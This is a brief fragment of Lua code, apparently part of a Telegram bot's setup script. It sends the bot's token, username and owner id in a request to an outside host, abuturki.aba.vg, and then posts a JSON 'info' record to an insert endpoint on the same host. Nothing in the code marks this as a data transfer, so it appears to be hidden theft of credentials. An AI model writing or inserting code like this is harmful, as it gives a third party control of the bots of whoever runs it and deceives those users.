...
print('('..SUDO_USER..')')
local url , res = https.request( 'https://abuturki.aba.vg/yakot/index.php' ..Token.. username ..GetUser.result.username.. id ..SUDO_USER)
print(res)
if res ~= 200 then
...
https.request('https://abuturki.aba.vg/request/?insert='..JSON.encode(info))
